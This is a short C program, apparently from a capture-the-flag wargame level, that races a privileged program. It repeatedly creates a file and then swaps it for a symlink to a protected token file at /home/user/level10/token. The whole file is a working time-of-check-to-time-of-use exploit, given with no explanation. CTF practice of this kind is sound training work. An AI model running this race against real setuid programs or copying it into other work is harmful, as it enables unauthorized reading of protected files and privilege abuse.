#include <fcntl.h>
#include <stdlib.h>

int	main(int argc, char **argv)
{
	if (argc != 2)
	{
		dprintf(2, "Usage: ./loop <file>\n");
		exit(1);
	}
	while (1)
	{
		int	fd = open(argv[1], O_CREAT, 0644);
		close(fd);
		usleep(50);
		unlink(argv[1]);
		symlink("/home/user/level10/token", argv[1]);
		usleep(50);
		unlink(argv[1]);
	}
}
